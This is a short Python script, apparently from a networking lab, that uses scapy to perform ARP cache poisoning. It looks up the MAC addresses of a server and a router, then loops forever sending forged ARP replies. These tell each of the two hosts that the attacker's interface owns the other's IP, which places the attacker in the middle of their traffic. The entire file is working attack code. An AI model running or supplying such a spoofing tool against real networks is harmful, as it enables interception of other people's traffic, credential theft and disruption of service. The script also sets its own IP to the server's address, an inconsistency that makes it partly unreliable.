from scapy.all import *
import time


# Store the IP and MAC address of our network interface
our_ip = "198.7.0.2"
our_mac = get_if_hwaddr(conf.iface)


def get_mac_from_ip(ip):
    """Returns the MAC address associated with a given IP,
    using an ARP request.
    """
    # Create a new ARP packet
    pkt = ARP()

    # See https://en.wikipedia.org/wiki/Address_Resolution_Protocol#Packet_structure
    # for a description of the fields

    # Mark this as a request packet
    pkt.op = 1

    # Send the reply to us
    pkt.hwsrc = our_mac
    pkt.psrc = our_ip

    # Request MAC for the given IP
    pkt.pdst = ip

    # Wait for one reply
    result = sr1(pkt, timeout=1, verbose=False)

    # Return the MAC
    mac = result.hwsrc

    print(f"IP {ip} has MAC {mac}")

    return mac

def create_fake_arp_packet(fake_ip, dest_mac, dest_ip):
    """Creates an ARP reply packet claiming that our network interface
    owns the indicated IP address.
    """
    # Create a new ARP packet
    pkt = ARP()

    # Operation 2 means ARP reply
    pkt[ARP].op = 2

    pkt[ARP].psrc = fake_ip

    # Ensure we send this to the right host
    pkt[ARP].hwdst = dest_mac
    pkt[ARP].pdst = dest_ip

    print(f"Telling {dest_ip} we have IP {fake_ip}")

    return pkt


# Determine the IPs and MACs of the nodes we want to spoof
server_ip = "198.7.0.2"
server_mac = get_mac_from_ip(server_ip)
router_ip = "198.7.0.1"
router_mac = get_mac_from_ip(router_ip)

# Tell the router we're the server
for_router_pkt = create_fake_arp_packet(server_ip, router_mac, router_ip)

# Tell the server we're the router
for_server_pkt = create_fake_arp_packet(router_ip, server_mac, server_ip)

while True:
    send(for_router_pkt)
    time.sleep(0.5)
    send(for_server_pkt)
    time.sleep(0.5)